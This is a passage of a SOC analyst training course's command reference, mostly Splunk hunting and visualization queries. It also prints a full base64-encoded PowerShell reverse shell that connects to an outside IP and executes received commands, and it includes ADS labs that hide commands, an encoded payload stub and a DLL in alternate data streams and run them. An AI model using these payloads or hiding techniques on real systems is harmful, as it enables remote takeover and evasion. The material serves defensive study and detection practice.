+<h4>Maximum and Minimum byte value</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" 
+| stats max(bytes)</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" 
+| stats min(bytes)</pre>
+</div>
+
+<h4>Sum of bytes</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" 
+| stats sum(bytes)</pre>
+</div>
+
+<h4>Count of byte events</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" 
+| stats count(bytes)</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+<li><a target="_blank" href="https://soc201.com/j6yePE">Measures of Central Tendency (Laerd Statistics)</a></li>
+<li><a target="_blank" href="https://soc201.com/VmTSZI">Standard Deviation (Investopedia)</a></li>
+<li><a target="_blank" href="https://soc201.com/N0fHF1">Splunk - Aggregate Functions</a></li>
+</ul>
+
+<h1>Visualizations in Splunk</h1>
+
+<h4>Bar chart of non-200 status codes</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" status!=200
+| chart count by status
+| sort -count</pre>
+</div>
+
+<h4>Pie chart of top 5 client IPs</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web"
+| chart count by clientip
+| sort -count
+| head 5</pre>
+</div>
+
+<h4>Multi-dimensional aggregation by client IP and user agent</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web"
+| stats count by clientip,useragent
+| where count > 1
+| sort by -count</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web"
+| stats count by clientip,uri_path,useragent
+| where count > 1
+| sort by -count</pre>
+</div>
+
+<h4>Charting with "chart"</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" status=302
+| chart count by clientip,uri_path</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" status=302
+| chart count by uri_path,clientip</pre>
+</div>
+
+<h4>Timechart of events per minute for a specific client IP</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" clientip=95.104.164.170
+| timechart span=1m count</pre>
+</div>
+
+<h4>IP location and lookup with table</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web"
+| iplocation clientip
+| table _time, clientip, Country, City, uri_path</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web"
+| iplocation clientip
+| geostats count by Country</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" uri_path="*wp-admin*"
+| iplocation clientip
+| geostats count by City</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+<li><a target="_blank" href="https://soc201.com/OHSS8k">Stats, Chart, and Timechart (Splunk)</a></li>
+<li><a target="_blank" href="https://soc201.com/I3u7qj">Chart documentation (Splunk)</a></li>
+<li><a target="_blank" href="https://soc201.com/8AziZn">Creating visualizations in Kibana Lens (Elastic)</a></li>
+</ul>
+
+<h1>Masquerading</h1>
+
+<h2>References</h2>
+<ul>
+<li><a target="_blank" href="https://soc201.com/c5kvuv">DNSTwist - Phishing Domain Scanner</a></li>
+<li><a target="_blank" href="https://soc201.com/Nhleek">Hunt Evil Poster (SANS)</a></li>
+</ul>
+
+<h1>Frequency & Volume Anomalies</h1>
+
+<h2>References</h2>
+<ul>
+<li><a target="_blank" href="https://soc201.com/XsbG1B">PCR - A New Flow Metric (Bullard, C., & Gerth, J)</a></li>
+<li><a target="_blank" href="https://soc201.com/YZV711">Detecting Data Staging & Exfil Using PCR (David J. Bianco)</a></li>
+</ul>
+
+<h1>Obfuscated PowerShell Analysis</h1>
+
+<h4>Obfuscated Base64 PowerShell example</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAOQA0AC4AMgA1ADQALgAwAC4AMgAzADQAIgAsADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAawAyACAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==</pre>
+</div>
+
+<h4>Navigate to the lab directory</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>cd C:\Users\tcm\Desktop\Class_Files\labs\06c789c0</pre>
+</div>
+
+<h4>Check current PowerShell ShellId</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>$ShellId</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+<li><a target="_blank" href="https://soc201.com/VjXxUh">The Curious Case of an Egg-Cellent Resume (The DFIR Report)</a></li>
+<li><a target="_blank" href="https://soc201.com/u5wcYM">Boss of the SOC (Splunk)</a></li>
+<li><a target="_blank" href="https://gchq.github.io/CyberChef/">CyberChef</a></li>
+<li><a target="_blank" href="https://soc201.com/YAOPD">Yet Another Obfuscated PowerShell Detector</a></li>
+<li><a target="_blank" href="https://soc201.com/iC1CCJ">PowerShell Obfuscation Bible</a></li>
+<li><a target="_blank" href="https://soc201.com/PMAT">Practical Malware Analysis and Triage</a></li>
+</ul>
+
+<h1>Entropy Analysis</h1>
+
+<h4>Change to lab directory</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>cd ~/Desktop/Class_Files/labs/0cdf57a5</pre>
+</div>
+
+<h4>Show file type</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>file hello.exe</pre>
+</div>
+
+<h4>Compress to gzip</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>gzip -c hello.exe > hello.gz</pre>
+</div>
+
+<h4>Encrypt with OpenSSL</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>openssl enc -aes-256-cbc -in hello.exe -out hello.bin -nosalt</pre>
+</div>
+
+<h4>Entropy checks</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>ent hello.exe</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>ent hello.gz</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>ent hello.bin</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+<li><a target="_blank" href="https://soc201.com/FsbOyy">Ent (Entropy)</a></li>
+</ul>
+
+<h1>Alternate Data Stream (ADS) Analysis</h1>
+
+<h4>Change to lab directory</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>cd C:\Users\tcm\Desktop\Class_Files\labs\2999c954</pre>
+</div>
+
+<p><i>Ensure you are in a cmd.exe command-prompt.</i></p>
+
+<h4>Create a text file</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>echo "Hello world!" > grocery.txt</pre>
+</div>
+
+<h4>Create an alternate data stream with secret text</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>echo "This is my secret message..." > grocery.txt:hidden</pre>
+</div>
+
+<h4>Read ADS using more</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>more &lt; grocery.txt:hidden</pre>
+</div>
+
+<h4>Show file contents (default stream)</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Content .\grocery.txt</pre>
+</div>
+
+<h4>List all streams on a file</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Item .\grocery.txt -Stream *</pre>
+</div>
+
+<h4>Read a named stream</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Content .\grocery.txt -Stream hidden</pre>
+</div>
+
+<h4>Write a command into an ADS</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Set-Content -Path .\grocery.txt:command -Value "ipconfig"</pre>
+</div>
+
+<h4>Invoke-Expression from ADS</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Invoke-Expression (Get-Content -Path .\grocery.txt:command -Raw)</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>$c = Get-Content .\grocery.txt -Stream command
+iex $c</pre>
+</div>
+
+<h4>Write another command into ADS</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Set-Content -Path .\grocery.txt:command2 -Value "calc.exe"</pre>
+</div>
+
+<h4>Execute the command from the ADS</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>$c = Get-Content .\grocery.txt -Stream command2
+iex $c</pre>
+</div>
+
+<h4>Write a third ADS with base64 encoded PowerShell (example)</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Set-Content -Path .\grocery.txt:command3 -Value "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMAAuADAALgAwAC4AMAAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABp..."</pre>
+</div>
+
+<h4>Run a command shell to show alternate data streams on Windows</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>cmd /c "dir /r"</pre>
+</div>
+
+<h4>Write a DLL into an ADS as bytes</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Content .\HelloWorld\HelloWorld.dll -Encoding Byte | Set-Content .\grocery.txt:evildll -Encoding Byte</pre>
+</div>
+
+<h4>Invoke a DLL stored in an ADS with rundll32</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>rundll32.exe .\grocery.txt:evildll,HelloWorld</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+<li><a target="_blank" href="https://soc201.com/glY1Nv">Zone Identifier Alternate Data Streams (CloudSEK)</a></li>
+</ul>
+
+<h1>Dissecting Threat Reports</h1>
+
+<h2>References</h2>
+<ul>
+<li><a target="_blank" href="https://soc201.com/U73q3x">BlackByte Ransomware Intrusion Case Study (Microsoft)</a></li>
+<li><a target="_blank" href="https://soc201.com/attack">MITRE ATT&CK</a></li>
+<li><a target="_blank" href="https://soc201.com/navigator">MITRE ATT&CK Navigator</a></li>
+</ul>
+
+
+<h1>Intrusion Analysis Resources</h1>
+
+<h2>References</h2>
+<ul>
+<li><a target="_blank" href="https://soc201.com/dfir-report">The DFIR Report</a></li>
+<li><a target="_blank" href="https://soc201.com/u8RoWb">Palo Alto Unit 42</a></li>
+<li><a target="_blank" href="https://soc201.com/074baZ">Cisco Talos Reports</a></li>
+<li><a target="_blank" href="https://soc201.com/G77b2I">WeLiveSecurity (ESET)</a></li>
+<li><a target="_blank" href="https://soc201.com/ozAVpF">Huntress</a></li>
+<li><a target="_blank" href="https://soc201.com/ifE5iG">Bitdefender Threat Research</a></li>
+<li><a target="_blank" href="https://soc201.com/M89Swk">Google Cloud / Mandiant</a></li>
+<li><a target="_blank" href="https://soc201.com/Gfuqvy">Aqua Security</a></li>
+</ul>
+
+<h1>Hunting PowerShell Execution</h1>
+
+<h4>List all data sources in the index</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>| metadata type=sources index="aa15cbf9"</pre>
+</div>
+
+<h4>Find PowerShell executions not launched from Explorer</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1 Image=*powershell.exe AND ParentImage!="C:\\Windows\\explorer.exe"</pre>
+</div>
+
+<h4>Count PowerShell executions by image</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1 Image=*powershell.exe AND ParentImage!="C:\\Windows\\explorer.exe"
+| stats count by Image</pre>
+</div>
+
+<h4>Find PowerShell executions with escaped backslashes</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1 Image=*\\powershell.exe AND ParentImage!="C:\\Windows\\explorer.exe"</pre>
+</div>
+
+<h4>Count PowerShell executions with escaped backslashes by image</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1 Image=*\\powershell.exe AND ParentImage!="C:\\Windows\\explorer.exe"
+| stats count by Image</pre>
+</div>
+
+<h4>Show detailed PowerShell execution context</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1 Image=*\\powershell.exe AND ParentImage!="C:\\Windows\\explorer.exe"
+| table _time
+       host
+       user
+       Image
+       CommandLine
+       ParentImage
+       ParentCommandLine
+       IntegrityLevel
+| sort -_time</pre>
+</div>
+
+<h4>Search all PowerShell Operational logs</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-PowerShell/Operational"</pre>
+</div>
+
+<h4>Count PowerShell 4103 script block logs by payload</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-PowerShell/Operational" EventID=4103
+| stats count by Payload</pre>
+</div>
+
+<h4>Exclude benign PowerShell payloads and count remaining</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-PowerShell/Operational" EventID=4103
+| where NOT like(Payload, "%.inf%")
+| stats count by Payload</pre>
+</div>
+
+<h4>Search for references to dghelper.dll</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" "dghelper.dll"</pre>
+</div>
+
+<h4>Find Sysmon network connections to 10.0.2.6</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=3 DestinationIp="10.0.2.6"</pre>
+</div>
+
+<h4>Show processes spawned by ParentProcessId 3916</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1 ParentProcessId=3916
+| table _time, host, user, Image, CommandLine
+| sort -_time</pre>
+</div>
+
+<h4>Show details for ProcessId 3916</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1 ProcessId=3916
+| table _time, host, user, Image, CommandLine, ParentImage
+| sort -_time</pre>
+</div>
+
+<h4>Investigate suspicious binary THybZSNv.exe</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1 Image="C:\\Windows\\THybZSNv.exe"
+| table _time, host, user, Image, CommandLine, ParentImage,
+| sort -_time</pre>
+</div>
+
+<h4>Investigate suspicious binary THybZSNv.exe with hash</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1 Image="C:\\Windows\\THybZSNv.exe"
+| table _time, host, user, Image, CommandLine, ParentImage, MD5
+| sort -_time</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+<li><a target="_blank" href="https://soc201.com/UjPuVu">Sysmon (Sysinternals)</a></li>
+<li><a target="_blank" href="https://soc201.com/attack">MITRE ATT&CK</a></li>
+<li><a target="_blank" href="https://soc201.com/vKzLA">VirusTotal</a></li>
+</ul>
+
+<h1>Hunting Cmd Execution</h1>
+
+<h4>Find cmd.exe processes not launched from Explorer</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Security" EventID=4688 NewProcessName="*\\cmd.exe" AND ParentProcessName!="C:\\Windows\\explorer.exe"</pre>
+</div>
+
+<h4>Show detailed cmd.exe process creation context</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Security" EventID=4688 NewProcessName="*\\cmd.exe" AND ParentProcessName!="C:\\Windows\\explorer.exe"
+| table _time
+    Computer
+    SubjectUserName
+    NewProcessName
+    NewProcessId
+    CommandLine
+    ParentProcessName
+    ProcessId
+| sort -_time</pre>
+</div>
+
+<h4>Convert hexadecimal process IDs to decimal for cmd.exe events</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Security" EventID=4688 NewProcessName="*\\cmd.exe" AND ParentProcessName!="C:\\Windows\\explorer.exe"
+| eval NewProcessId=tonumber(NewProcessId, 16), ProcessId=tonumber(ProcessId, 16)
+| table _time
+    Computer
+    SubjectUserName
+    NewProcessName
+    NewProcessId
+    CommandLine
+    ParentProcessName
+    ProcessId
+| sort -_time</pre>
+</div>
+
+<h4>Show cmd.exe events with renamed decimal process ID fields</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Security" EventID=4688 NewProcessName="*\\cmd.exe" AND ParentProcessName!="C:\\Windows\\explorer.exe"
+| eval d_NewProcessId = tonumber(NewProcessId, 16), d_ProcessId= tonumber(ProcessId, 16)
+| table _time
+    Computer
+    SubjectUserName
+    NewProcessName
+    d_NewProcessId 
+    CommandLine
+    ParentProcessName
+    d_ProcessId
+| sort -_time</pre>
+</div>
+
+<h4>Find process creation events where ProcessId equals 3916</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Security" EventID=4688
+| eval NewProcessId=tonumber(NewProcessId, 16), ProcessId=tonumber(ProcessId, 16)
+| search ProcessId=3916
+| table _time
+    Computer
+    SubjectUserName
+    NewProcessName
+    NewProcessId
+    CommandLine
+    ParentProcessName
+    ProcessId
+| sort -_time</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+<li><a target="_blank" href="https://soc201.com/Fhx19O">Windows Security Event ID 4688</a></li>
+</ul>
+
+<h1>Hunting Process Trees</h1>
+
+<h4>Build process tree for all Sysmon process creations</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1 
+| fields *
+| pstree child=Image parent=ParentImage
+| table tree</pre>
+</div>
+
+<h4>Build detailed process tree with timestamps and command lines</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1 
+| rex field=ParentImage "\x5c(?<ParentName>[^\x5c]+)$"
+| rex field=Image "\x5c(?<ProcessName>[^\x5c]+)$"
+| eval parent = ParentName." (".ParentProcessId.")"
+| eval child = ProcessName." (".ProcessId.")"
+| eval detail=strftime(_time,"%Y-%m-%d %H:%M:%S")." ".CommandLine
+| pstree child=child parent=parent detail=detail spaces=50
+| table tree</pre>
+</div>
+
+<h4>Show process tree filtered for THybZSNv.exe executions</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1 
+| rex field=ParentImage "\x5c(?<ParentName>[^\x5c]+)$"
+| rex field=Image "\x5c(?<ProcessName>[^\x5c]+)$"
+| eval parent = ParentName." (".ParentProcessId.")"
+| eval child = ProcessName." (".ProcessId.")"
+| eval detail=strftime(_time,"%Y-%m-%d %H:%M:%S")." ".CommandLine
+| pstree child=child parent=parent detail=detail spaces=50
+| search tree=*THybZSNv.exe
+| table tree</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+<li><a target="_blank" href="https://soc201.com/pI0KWk">PSTree for Splunk</a></li>
+<li><a target="_blank" href="https://soc201.com/I5h2DP">Process Hunting with PSTree (Splunk)</a></li>
+</ul>
+
+<h1>Hunting Persistence: Registry Run Keys</h1>
+
+<h4>Search for all Sysmon EventID 13 (Registry value changes)</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=13</pre>
+</div>
+
+<h4>Show Run key modifications in Sysmon EventID 13</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=13
+TargetObject="*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run*"
+| table _time, Computer, User, TargetObject, Details, Image
+| sort -_time</pre>
+</div>
+
+<h4>Show Run key modifications including ProcessGuid</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=13
+TargetObject="*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run*"
+| table _time, Computer, User, TargetObject, Details, Image, ProcessGuid
+| sort -_time</pre>
+</div>
+
+<h4>Correlate process creations with Run key modifications</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1
+[ search index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=13 TargetObject="*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run*" 
+  | fields ProcessGuid ]
+| table _time, Computer, User, Image, CommandLine, Company, MD5
+| sort -_time</pre>
+</div>
+
+<h4>Count unique binaries associated with Run key modifications</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1
+[ search index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=13 TargetObject="*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run*" 
+  | fields ProcessGuid ]
+| stats count by MD5</pre>
+</div>
+
+<h4>Run key modifications including ProcessGuid (duplicate)</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=13
+TargetObject="*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run*"
+| table _time, Computer, User, TargetObject, Details, Image, ProcessGuid
+| sort -_time</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+<li><a target="_blank" href="https://soc201.com/UjPuVu">Sysmon (Sysinternals)</a></li>
+<li><a target="_blank" href="https://soc201.com/attack">MITRE ATT&CK</a></li>
+<li><a target="_blank" href="https://soc201.com/vKzLA">VirusTotal</a></li>
+</ul>
+
+
+<h1>Hunting Persistence: Lookup Tables</h1>
+
+<h4>Lookup MITRE mappings for registry persistence events</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=13
+| lookup registry_persistence_lookup RegistryPath AS TargetObject OUTPUT MITRE_ID, Description
+| where isnotnull(MITRE_ID)</pre>
+</div>
+
+<h4>Show MITRE-mapped registry persistence events with details</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=13
+| lookup registry_persistence_lookup RegistryPath AS TargetObject OUTPUT MITRE_ID, Description
+| where isnotnull(MITRE_ID)
+| table _time, Computer, User, TargetObject, Details, Image, MITRE_ID, Description
+| sort -_time</pre>
+</div>
+
+<h4>Show dghelper.dll process executions</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1 "dghelper.dll"
+| table _time, Image, CommandLine, ParentImage, ParentCommandLine
+| sort -_time</pre>
+</div>
+
+<h4>Find reg.exe processes spawned by cmd.exe</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1
+Image="*\\reg.exe" AND ParentImage="*\\cmd.exe"</pre>
+</div>
+
+<h4>Show details of reg.exe spawned by cmd.exe</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1
+Image="*\\reg.exe" AND ParentImage="*\\cmd.exe"
+| table _time host user Image CommandLine ParentImage ParentCommandLine IntegrityLevel
+| sort -_time</pre>
+</div>
+
+<h4>Filter registry events for reg.exe or PowerShell executions</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=13
+| where like(Image, "%\\reg.exe") OR like(Image, "%\\powershell.exe")</pre>
+</div>
+
+<h4>Show detailed registry events for reg.exe or PowerShell</h4>
+<div class="code-block">
